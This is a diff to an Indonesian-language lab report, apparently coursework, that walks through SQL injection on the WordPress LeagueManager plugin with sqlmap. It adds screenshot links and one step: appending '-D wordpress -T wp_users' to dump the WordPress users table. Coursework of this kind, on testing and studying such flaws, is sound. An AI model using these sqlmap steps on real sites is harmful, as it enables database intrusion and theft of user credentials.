@@ -150,6 +150,17 @@ python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
+![leaguemanager 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables7.png)
+![leaguemanager 8](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables8.png)
+![leaguemanager 9](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables9.png)
+![leaguemanager 10](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables11.png)
+![leaguemanager 11](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables12.png)
+
+- Dari hasil sebelumnya didapatkan list database dan table yang ada pada server. Untuk mendapatkan isi tabel wp_users dari database wordpress, maka tambahkan `-D wordpress -T wp_users` pada perintah dan jalankan. Hasil:
+
+![leaguemanager 12](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables13.png)
+![leaguemanager 14](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables15.png)
+
 ## Kesimpulan dan Saran
 
 ### Kesimpulan
